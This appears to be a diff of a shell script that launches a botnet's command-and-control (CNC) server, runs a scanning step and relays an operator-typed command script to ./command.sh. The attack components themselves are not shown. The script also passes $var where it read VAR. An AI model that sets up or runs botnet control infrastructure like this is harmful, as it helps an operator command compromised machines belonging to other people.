@@ -11,15 +11,30 @@ fi
 
 ./init.sh
 
-echo ""
-echo ""
+echo "Database Initialized"
 
-echo "Starting the Scanning process and the CNC server"
+sleep 3
+
+echo "Starting the CNC server"
 
 cd botnet
 
+nohup python server.py &
+
+echo "The CNC Server is up and running"
+
+echo "The PiD for the server Process "
+lsof -i:5000
+
 echo $1
+
 
 ./run.sh $1
 
+sleep 2
 
+read -p "command script input here : " VAR
+
+echo $VAR
+
+./command.sh $var
